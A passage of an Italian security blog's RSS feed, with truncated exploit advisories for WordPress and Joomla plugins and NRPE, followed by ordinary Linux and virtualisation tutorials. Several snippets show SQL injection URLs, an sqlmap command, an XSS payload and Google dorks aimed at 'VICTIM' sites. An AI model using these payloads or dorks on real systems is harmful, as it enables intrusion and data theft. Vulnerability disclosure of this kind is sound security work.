+      <description>####################### Exploit Title : WordPress Huge-IT Image Gallery 1.0.1 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://huge-it.com/# Software Link : http://downloads.wordpress.org/plugin/gallery-images.zip (Fixed)Mirror Link : https://mega.co.nz/#!3EoUzSQI!yrl75XQsp1ggxDCjW-wq7yUxLdbLu0WHPNFcJAxJOHs# Date : 2014-08-25# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/gallery-images/admin/gallery_func.php####################### Vulnerable code :function editgallery($id){global $wpdb;if(isset($_GET[&amp;#34;removeslide&amp;#34;])){if($_GET[&amp;#34;removeslide&amp;#34;] !</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/01/wordpress-slideshow-gallery-1-4-6-shell-upload-vulnerability/</link>
+      <pubDate>Mon, 01 Sep 2014 21:04:05 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/01/wordpress-slideshow-gallery-1-4-6-shell-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://tribulant.com# Software Link : http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip# Date : 2014-08-09# Tested on : Windows 7 / Mozilla Firefox####################### Description : Any user could upload php files (administrator by default).####################### Locationhttp://127.0.0.1/wp-content/plugins/slideshow-gallery/views/admin/slides/save.php####################### PoC Exploit:POSTHost=127.0.0.1User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.</description>
+    </item>
+    
+    <item>
+      <title>NRPE 2.15 Remote Command Execution Exploit</title>
+      <link>https://www.homelab.it/index.php/2014/08/28/nrpe-2-15-remote-command-execution-exploit/</link>
+      <pubDate>Thu, 28 Aug 2014 20:48:38 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/28/nrpe-2-15-remote-command-execution-exploit/</guid>
+      <description>NRPE 2.15 Remote Command Execution python Exploit – CVE-2014-2913
+Download Exploit: HERE
+Custom Command Mode: claudio@backbox3:~/Desktop$ ./nrpe_215_rce_exploit.py -H 10.0.0.70 --cmd=&amp;#34;id&amp;#34; -c check_users$$\ $$\ $$$$$$$\ $$$$$$$\ $$$$$$$$\ $$$$$$\ $$\ $$$$$$$\$$$\ $$ |$$ __$$\ $$ __$$\ $$ _____| $$ __$$\ $$$$ | $$ ____|$$$$\ $$ |$$ | $$ |$$ | $$ |$$ | \__/ $$ | \_$$ | $$ |$$ $$\$$ |$$$$$$$ |$$$$$$$ |$$$$$\ $$$$$$ | $$ | $$$$$$$\$$ \$$$$ |$$ __$$&amp;lt; $$ ____/ $$ __| $$ ____/ $$ | \_____$$\$$ |\$$$ |$$ | $$ |$$ | $$ | $$ | $$ | $$\ $$ |$$ | \$$ |$$ | $$ |$$ | $$$$$$$$\ $$$$$$$$\ $$\ $$$$$$\$$$$$$ |\__| \__|\__| \__|\__| \________| \________|\__|\______|\______/$$$$$$$\ $$$$$$\ $$$$$$$$\$$ __$$\ $$ __$$\ $$ _____|$$ | $$ |$$ / \__|$$ |$$$$$$$ |$$ | $$$$$\$$ __$$&amp;lt; $$ | $$ __|$$ | $$ |$$ | $$\ $$ |$$ | $$ |\$$$$$$ |$$$$$$$$\\__| \__| \______/ \________|NRPE &amp;lt;= 2.</description>
+    </item>
+    
+    <item>
+      <title>aLFI Scanner – An0th3r LFI sC4Nn3r v1.0</title>
+      <link>https://www.homelab.it/index.php/2014/08/26/alfi-scanner-an0th3r-lfi-sc4nn3r-v1-0/</link>
+      <pubDate>Tue, 26 Aug 2014 19:40:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/26/alfi-scanner-an0th3r-lfi-sc4nn3r-v1-0/</guid>
+      <description>[claudio@localhost ~]$ ./aLFIscanner.py -u 10.0.0.67 -t lfi.php?ID=$$\ $$$$$$$$\ $$$$$$\$$ | $$ _____|\_$$ _|$$$$$$\ $$ | $$ | $$ |\____$$\ $$ | $$$$$\ $$ |$$$$$$$ |$$ | $$ __| $$ |$$ __$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$$\ $$ | $$$$$$\\_______|\________|\__| \______|$$$$$$\$$ __$$\$$ / \__| $$$$$$$\ $$$$$$\ $$$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$\\$$$$$$\ $$ _____|\____$$\ $$ __$$\ $$ __$$\ $$ __$$\ $$ __$$\\____$$\ $$ / $$$$$$$ |$$ | $$ |$$ | $$ |$$$$$$$$ |$$ | \__|$$\ $$ |$$ | $$ __$$ |$$ | $$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$$\$$$$$$$ |$$ | $$ |$$ | $$ |\$$$$$$$\ $$ |\______/ \_______|\_______|\__| \__|\__| \__| \_______|\__|An0th3r LFI sC4Nn3r v1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider video player 2.8.3 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</link>
+      <pubDate>Tue, 26 Aug 2014 18:41:55 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider video player 2.8.3 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://extensions.joomla.org/extensions/multimedia/multimedia-players/video-players-a-gallery/22321# Dork Google: inurl:/component/spidervideoplayerinurl:option=com_spidervideoplayer # Date : 2014-08-26# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/component/spidervideoplayer/?view=settings&amp;amp;format=row&amp;amp;typeselect=0&amp;amp;playlist=1,&amp;amp;theme=1&amp;#39;&amp;#34;theme&amp;#34; variable is not sanitized.#####################Discovered By : Claudio Vivianihttp://www.homelab.itinfo@homelab.ithomelabit@protonmail.chhttps://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/08/10/wordpress-gb-gallery-slideshow/</link>
+      <pubDate>Sun, 10 Aug 2014 13:20:45 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/10/wordpress-gb-gallery-slideshow/</guid>
+      <description>####################### Exploit Title : WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://gb-plugins.com/# Software Link : http://downloads.wordpress.org/plugin/gb-gallery-slideshow.1.5.zip# Date : 2014-08-09# Tested on : Linux / sqlmap 1.0-dev-5b2ded0Linux / Mozilla Firefox####################### Location : http://localhost/wp-content/plugins/gb-gallery-slideshow/GBgallery.php####################### Vulnerable code :if(isset($_POST[&amp;#39;selected_group&amp;#39;])){global $gb_post_type, $gb_group_table, $wpdb;$my_group_id = $_POST[&amp;#39;selected_group&amp;#39;];$my_group = $wpdb-&amp;gt;get_results( &amp;#34;SELECT groups FROM $gb_group_table WHERE id = &amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>XenServer Avvio automatico macchine virtuali</title>
+      <link>https://www.homelab.it/index.php/2014/08/09/xenserver-avvio-automatico-macchine-virtuali/</link>
+      <pubDate>Sat, 09 Aug 2014 16:31:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/09/xenserver-avvio-automatico-macchine-virtuali/</guid>
+      <description>Volete permettere a XenServer di avviare le macchina virtuali al momento del boot?
+Nella versione 6.x di XenServer è stata tolta la possibilità di abilitare tramite GUI l’avvio automatico delle macchine virtuali.
+Per ovviare a questa mancanza basta eseguire due semplici operazioni collegandosi tramite client ssh verso l’hypervisor.
+ Configurazione XenServer per l’avvio automatico   Per abilitare XenServer all’avvio automatico delle macchine virtuali si deve prima individuare il numero UUID del pool:</description>
+    </item>
+    
+    <item>
+      <title>IPFire e VMware tools</title>
+      <link>https://www.homelab.it/index.php/2014/08/08/ipfire-e-vmware-tools/</link>
+      <pubDate>Fri, 08 Aug 2014 12:51:19 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/08/ipfire-e-vmware-tools/</guid>
+      <description>Nei repository IPFire è presente un paccheto dal nome: openvmtools.
+Per installare il pacchetto si possono seguire due procedimenti:
+1) Installazione tramite interfaccia web di managment 2) installazione tramite client ssh: Conclusa l’installazione è possibile verificare la corretta installazione tramite vSphere Client:</description>
+    </item>
+    
+    <item>
+      <title>WordPress 3.x, 4.x Path Traversal &#43; Directory Listing &#43; File Deletion Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/</link>
+      <pubDate>Wed, 06 Aug 2014 21:25:44 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : https://wordpress.org# Software Link : http://wordpress.org/wordpress-3.9.2.tar.gz# Date : 2014-07-11# Tested on : Mozilla Firefox / WordPress 4.0 beta 1# Mozilla Firefox / WordPress 4.0 beta 2# Mozilla Firefox / WordPress 4.0 beta 3# Mozilla Firefox / WordPress 3.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/08/02/wordpress-gmedia-gallery-1-2-1-shell-upload-vulnerability/</link>
+      <pubDate>Sat, 02 Aug 2014 13:47:24 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/02/wordpress-gmedia-gallery-1-2-1-shell-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.codeasily.com/# Software Link : http://downloads.wordpress.org/plugin/grand-media.zip# Date : 2014-08-01# Tested on : Windows 7 / Mozilla Firefox####################### Description : Any authenticated user could upload php files (administrator by default).####################### Vulnerability Disclosure Timeline:2014-08-01: Discovered vulnerability2014-08-01: Vendor Notification (Twitter)2014-08-01: Vendor Response/Feedback 2014-08-02: Vendor Fix/Patch 2014-08-02: Public Disclosure ####################### PoC:POSTHost=127.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slider Revolution &lt;= 4.1.4 Arbitrary File Download vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download/</link>
+      <pubDate>Mon, 28 Jul 2014 17:30:03 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download/</guid>
+      <description>####################### Exploit Title : WordPress Slider Revolution Responsive &amp;lt;= 4.1.4 Arbitrary File Download vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380# Software Link : Premium plugin# Dork Google: revslider.php &amp;#34;index of&amp;#34;# Date : 2014-07-24# Tested on : Windows 7 / Mozilla FirefoxLinux / Mozilla Firefox####################### DescriptionWordpress Slider Revolution Responsive &amp;lt;= 4.1.4 suffers from Arbitrary File Download vulnerability####################### PoChttp://victim/wp-admin/admin-ajax.</description>
+    </item>
+    
+    <item>
+      <title>ARP Cache Poisoning o più comunemente ARP Spoofing</title>
+      <link>https://www.homelab.it/index.php/2014/07/28/arp-cache-poisoning/</link>
+      <pubDate>Mon, 28 Jul 2014 16:45:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/28/arp-cache-poisoning/</guid>
+      <description>Introduzione Come ben sappiamo i computers all’interno di una rete LAN comunicano tra di loro usufruendo delle schede di rete collegate agli switch o hub.
+Lo switch è un dispositivo in grado di instradare i pacchetti di dati in modo logico, ovvero distribuisce al singolo pc i soli dati che ha richiesto (a livello di protocolli), evitando di fatto un invio su tutte le macchine (broadcast) come invece fa un hub.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.5 SQL Injection/XSS Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/07/24/wordpress-video-gallery-vulnerabilities/</link>
+      <pubDate>Thu, 24 Jul 2014 17:13:00 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/24/wordpress-video-gallery-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.5 SQL Injection and XSS Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : http://downloads.wordpress.org/plugin/contus-video-gallery.2.5.zip# Dork Google: inurl:/contus-video-gallery/hdflvplayer/hdplayer.swf(Click on &amp;#34;Repeat the search with the omitted results included&amp;#34;)# Date : 2014-07-15# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.</description>
+    </item>
+    
+    <item>
+      <title>SSH Public key su ESXi 5.x</title>
+      <link>https://www.homelab.it/index.php/2014/07/19/ssh-public-key-su-esxi-5-x/</link>
+      <pubDate>Sat, 19 Jul 2014 12:05:34 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/19/ssh-public-key-su-esxi-5-x/</guid>
+      <description>Per abilitare l’autenticazione ssh tramite chiave pubblica sul virtualizzatore VMware ESXi 5.x basta creare un nuovo file all’interno dell’hypervisor.
+Prendiamo come esempio la seguente chiave pubblica dell’utente root :
+_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfJAIbuQj+T0xD1uA3B1yOqsPCfORhRNLzkrA5OqW1HC2ZTdvgTj/UgP1KJ6UBC3Ux0DRIoEHwoPonG4XdwrSvQVaMYLG4G+kAHwZN5A3IL7D4aNGJPtMPmxfeVdsJHGCO2xIcpPmk/FpcJJW2IF3BlYqJr8sqbo6/odp0kNK83ROuek0Lbaqhs/NE1rxfKbYouko9Rg/DBnKIIIITxWYZuYYqa+uXPzprpb8n6YX5+EkiuTo9to0dyA/M5kYcRrbrv1aYjU2HsmQJiDz+x4KHvHIrAjcf0t9Fu5yLuV0KuiTnzdYL+FojkVNyW/hXNaT4fWI2iKYEaCc7vedqAPiZ root@backbox3_ SSH Public key su ESXi 5.x —&amp;gt; Test Connessione senza chiave Proviamo a stabilire una connessione ssh da una distribuzione linux verso il virtualizzatore ESXi 5.x (10.0.0.3)
+root@backbox3:~# ssh 10.0.0.3 The authenticity of host &amp;#39;10.0.0.3 (10.0.0.3)&amp;#39; can&amp;#39;t be established.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Gallery Objects 0.4 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/07/18/wordpress-gallery-objects-0-4-sql-injection/</link>
+      <pubDate>Fri, 18 Jul 2014 17:35:22 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/18/wordpress-gallery-objects-0-4-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Gallery Objects 0.4 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://galleryobjects.com/# Software Link : http://downloads.wordpress.org/plugin/gallery-objects.0.4.zip# Dork Google: inurl:/admin-ajax.php?action=go_view_object # Date : 2014-07-18# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0######################Poc via Browser:http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&amp;amp;viewid=1[ and 1=2]&amp;amp;type=htmlsqlmap:sqlmap -u &amp;#34;http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&amp;amp;viewid=1&amp;amp;type=html&amp;#34; -p viewid---Place: GETParameter: viewidType: boolean-based blindTitle: AND boolean-based blind - WHERE or HAVING clausePayload: action=go_view_object&amp;amp;viewid=475 AND 7403=7403&amp;amp;type=html---#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/07/15/wordpress-tidio-gallery-1-1-vulnerabilities/</link>
+      <pubDate>Tue, 15 Jul 2014 17:32:49 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/15/wordpress-tidio-gallery-1-1-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.tidioelements.com/# Software Link : http://downloads.wordpress.org/plugin/tidio-gallery.zip# Date : 2014-07-14# Tested on : Windows 7 / Mozilla Firefox####################### Location : http://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php -&amp;gt; XSShttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-post.php -&amp;gt; Upload Shell####################### Vulnerablity n°1:XSS Reflected Unauthenticatedhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=&amp;#34;/&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;# Vulnerablity n°2:Unprivileged user like subscriber could upload shell script.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Download Manager 2.6.8 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/12/wordpress-download-manager-2-6-8/</link>
+      <pubDate>Fri, 11 Jul 2014 23:31:02 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/12/wordpress-download-manager-2-6-8/</guid>
+      <description>####################### Exploit Title : WordPress Download Manager 2.6.8 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : www.wpdownloadmanager.com# Software Link : http://downloads.wordpress.org/plugin/download-manager.zip# Date : 2014-07-11# Tested on : Linux / Mozilla Firefox / WordPress Download Manager 2.6.8 Free Version# # # WORK ONLY ON SERVER WITH .HTACCESS FILES DISABLED####################### Location : http://IP_VICTIM/wp-content/plugins/download-manager/wpdm-add-new-file.php####################### Description :WordPress Download Manager 2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress BSK PDF Manager 1.3.2 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/07/10/wordpress-bsk-pdf-manager-sqlinj/</link>
+      <pubDate>Wed, 09 Jul 2014 23:31:32 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/10/wordpress-bsk-pdf-manager-sqlinj/</guid>
+      <description>####################### Exploit Title : WordPress BSK PDF Manager 1.3.2 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.bannersky.com/bsk-pdf-manager/# Software Link : http://downloads.wordpress.org/plugin/bsk-pdf-manager.zip# Date : 2014-07-04# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/compfight/compfight-search.php####################### Vulnerable code :[claudio@localhost ~]$ grep -R GET bsk-pdf-manager/bsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[&amp;#39;view&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;view&amp;#39;]){bsk-pdf-manager/inc/bsk-pdf-dashboard.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Compfight &lt;= 1.4 Authenticated Reflected XSS Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/03/wordpress-compfight-xss/</link>
+      <pubDate>Thu, 03 Jul 2014 20:04:28 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/03/wordpress-compfight-xss/</guid>
+      <description>####################### Exploit Title : WordPress Compfight 1.4 Authenticated Cross Site Scripting# Exploit Author : Claudio Viviani - HomeLab IT# Vendor Homepage : http://wordpress.org/plugins/easy-banners/# Software Link : http://downloads.wordpress.org/plugin/compfight.1.4.zip# Date : 2014-07-03# Tested on : Windows 7 / Mozilla Firefox####################### Location : http://localhost/wp-content/plugins/compfight/compfight-search.php####################### Vulnerable code :if (!$search_value) {$input_text = &amp;#39;Enter Keyword(s)&amp;#39;;} else {$input_text = $search_value;}if ($show_title) {$output .</description>
+    </item>
+    
+    <item>
+      <title>LFI – Come individuare e proteggersi dalla vulnerabilità Local File Inclusion Part.2</title>
+      <link>https://www.homelab.it/index.php/2014/06/26/lfi-individuarli-e-proteggersi2/</link>
+      <pubDate>Thu, 26 Jun 2014 20:04:04 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/06/26/lfi-individuarli-e-proteggersi2/</guid>
+      <description>Nella prima parte dell’articolo ho spiegato cosa è la vulnerabilità LFI soffermandomi anche su alcune tecniche di protezione a livello di programmazione, mentre in questo post affronterò l’aspetto sistemistico.
+Per circoscrivere l’area di lavoro di un applicativo web, e quindi di un eventuale Local File Inclusion, è possibile ricorrere almeno a tre soluzioni:
+ Utilizzo della funzione php open_basedir Configurazione di un ambiente chroot per Apache Applicazione delle regole di selinux per Apache   PHP openbasedir anti LFI   La funzione php open_basedir permette di limitare l’area d’azione di un applicativo ed è possibile configurarla a livello globale o tramite virtualhost specifici.</description>
+    </item>
+    
+    <item>
+      <title>Filtri command injection: escapeshellarg escapeshellcmd</title>
+      <link>https://www.homelab.it/index.php/2014/06/14/escapeshellarg-escapeshellcmd-command-injection/</link>
+      <pubDate>Sat, 14 Jun 2014 14:23:08 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/06/14/escapeshellarg-escapeshellcmd-command-injection/</guid>
+      <description>Proteggere i propri applicativi php è importantissimo sia, per l’integrità dei dati che del sistema.
+Nello scorso articolo ho fatto una panoramica sulla vulnerabilità Local File Inclusion, mentre oggi lo scopo dei test sarà quello di applicare al codice php dei filtri command injection, ovvero normalizzare le richieste in input eliminando la possibilità di eseguire comandi non autorizzati.
+Esempi di command injection Qui di seguito riporto un esempio di script php (filter-injection.</description>
+    </item>
+    
+    <item>
+      <title>LFI – Come individuare e proteggersi dalla vulnerabilità Local File Inclusion Part.1</title>
+      <link>https://www.homelab.it/index.php/2014/06/11/lfi-individuarli-e-proteggersi/</link>
+      <pubDate>Wed, 11 Jun 2014 18:39:06 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/06/11/lfi-individuarli-e-proteggersi/</guid>
+      <description>LFI – Introduzione Analizzando pagine web dinamiche di vari siti o ad esempio dei CMS (WordPress, Drupal, Joomla) è possibile notare come gli sviluppatori ottimizzino il codice distribuendolo su più pagine.
+In questo modo i programmatori evitano di creare file (ad esempio php) troppo grandi e di conseguenza meno chiari/flessibili.
+Per incorporare il contenuto di una pagina php dentro l’altra, vengono utilizzate le funzioni:
+include(&amp;lsquo;pagina2.php&amp;rsquo;);
+include_once(&amp;lsquo;pagina2.php&amp;rsquo;);
+require(&amp;lsquo;pagina2.php&amp;rsquo;);
+require_once(&amp;lsquo;pagina2.php&amp;rsquo;);
+Cosa può accadere se il nome della pagine inclusa viene richiamata col metodo GET o POST senza l’inserimento di adeguati filtri?</description>
+    </item>
+    
+    <item>
+      <title>Come scaricare ed installare gli aggiornamenti critici di Windows XP fino al 2019</title>
+      <link>https://www.homelab.it/index.php/2014/05/29/come-scaricare-ed-installare-gli-aggiornamenti-critici-di-windows-xp-fino-al-2019/</link>
+      <pubDate>Thu, 29 May 2014 06:27:32 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/29/come-scaricare-ed-installare-gli-aggiornamenti-critici-di-windows-xp-fino-al-2019/</guid>
+      <description>Introduzione Windows Embedded POSReady 2009 è il sistema operativo che si trova in molti dispositivi P.O.S e si basa su Windows XP.
+Microsoft ha deciso di prolungare la manutenzione di questo sistema operativo per i prossimi cinque anni, dato che i pos sono utilizzati in esercenti commerciali con presenza di dati sensibili.
+Creando un semplice file .reg ad hoc è possibile far credere a Windows Update di avere un sistema Windows Embedded POSReady 2009.</description>
+    </item>
+    
+    <item>
+      <title>Come installare Java su CentOS 6 (JDK)</title>
+      <link>https://www.homelab.it/index.php/2014/05/23/come-installare-java-su-centos-6-jdk/</link>
+      <pubDate>Thu, 22 May 2014 22:24:29 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/23/come-installare-java-su-centos-6-jdk/</guid>
+      <description>Download ed installazione Java (ultima versione)   Aprire il browser e inserie l’indirizzo: http://www.oracle.com/technetwork/java/javase/overview/index.html
+  Cliccare sul bottone Download:
+  
+Cliccare sull’icona Download:   
+Selezionare il bottone ratio “Accept License Agreement“:  
+Scaricare il pacchetto rpm a seconda dell’architettura del proprio sistema:   jdk-8u5-linux-i586.rpm jdk-8u5-linux-x64.rpm   Copiare il file rpm tramite scp client (se la macchina CentOS 6 è remota).
+  Con i privilegi di root installare il pacchetto rpm (nel mio caso i586) :</description>
+    </item>
+    
+    <item>
+      <title>Come installare VMware Player su Linux</title>
+      <link>https://www.homelab.it/index.php/2014/05/21/come-installare-vmware-player-su-linux/</link>
+      <pubDate>Wed, 21 May 2014 20:38:20 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/21/come-installare-vmware-player-su-linux/</guid>
+      <description>La seguente procedura è stata testata sia su CentOS 6 che Ubuntu 14.04, ma è applicabile anche ad altre distribuzioni.
+Sul sistema linux dovrà essere installato l’ambiente grafico, in caso contrario potete far riferimento al mio articolo che spiega come installarlo sulle distribuzioni CentOS:
+http://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/
+ Download VMware Player   Per prima cosa scariscari la versione più aggiornata di VMware Player dal sito ufficiale: http://www.vmware.com/
+Nel menu Downloads è possibile cliccare la voce “Player“:</description>
+    </item>
+    
+    <item>
+      <title>Come installare l’ambiente grafico su Linux CentOS in tre comandi</title>
+      <link>https://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/</link>
+      <pubDate>Wed, 21 May 2014 15:11:39 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/</guid>
+      <description>Downlaod e installazione ambiente grafico su CentOS 6 Se il vostro scopo è quello di installare l’ambiente grafico in una distribuzione CentOS, precedentemente configurata in modalità testuale, vi basteranno 3 semplici comandi:
+[root@centos6 ~]# yum -y groupinstall &amp;#34;X Window System&amp;#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall &amp;#34;Desktop&amp;#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall &amp;#34;General Purpose Desktop&amp;#34; Yum comincerà a scaricare ed installare una grossa quantità di pacchetti ed il tempo stimato per la conclusione varierà a seconda delle performance della vosta macchina e connessione internet.</description>
+    </item>
+    
+    <item>
+      <title>Come limitare l’utilizzo della CPU di un’applicazione su Linux</title>
+      <link>https://www.homelab.it/index.php/2014/05/20/come-limitare-lutilizzo-della-cpu-di-unapplicazione-su-linux/</link>
+      <pubDate>Tue, 20 May 2014 21:27:44 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/20/come-limitare-lutilizzo-della-cpu-di-unapplicazione-su-linux/</guid>
+      <description>Per limitare l’utilizzo della cpu sui sistemi linux è possibile usufruire dell’utility CPULIMIT.
+ Installazione Cpulimit   Debian/Ubuntu
+claudio@ubuntu:~$ sudo apt-get install cpulimit
+CentOS 6
+Prima di tutto installare il repository EPEL seguendo le istruzioni di questo articolo (REMI non è necessario):
+http://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6
+Una volta acquisito il repository, installare cpulimit:
+[root@centos6 ~]# yum install cpulimit
+Test Cpulimit   Per spiegare il funzionamento di cpulimit nel migliore dei modi, utilizzerò uno script bash che creerà loop fino a portare la CPU al limite.</description>
+    </item>
+    
+    <item>
+      <title>Come installare i repositories EPEL e REMI su CentOS 6</title>
+      <link>https://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6/</link>
+      <pubDate>Mon, 19 May 2014 23:20:28 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6/</guid>
+      <description>Introduzione Fonte: https://fedoraproject.org/wiki/EPEL/it
+‘Extra Packages for Enterprise Linux’ (o EPEL) è un gruppo speciale di utenti (Fedora Special Interest Group) che si interessa di creare, mantenere e gestire pacchetti RPM addizionali di alta qualità per Enterprise Linux, includendo, ma non limitato, Red Hat Enterprise Linux (RHEL), CentOS e Scientific Linux (SL).
+I pacchetti EPEL sono solitamente basati sulla loro controparte in Fedora, non saranno mai in conflitto né un rimpiazzo con quelli base per le distribuzioni Enterprise Linux.</description>
+    </item>
+    
+    <item>
+      <title>Chkrootkit – Come installare e schedulare rootkit scanner su Linux</title>
+      <link>https://www.homelab.it/index.php/2014/05/20/chkrootkit-come-installare-e-schedulare-rootkit-scanner-su-linux/</link>
+      <pubDate>Mon, 19 May 2014 22:57:45 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/20/chkrootkit-come-installare-e-schedulare-rootkit-scanner-su-linux/</guid>
+      <description>Chkrootkit è una raccolta di script e tools scritti in C che aiutanto gli amministratori di sistema a rilevare eventuali rootkit o LKM maligni installati sui sistemi Linux.
+Per installare chrootkit su CentOS 6, basta usufruire del repository EPEL tramite yum.
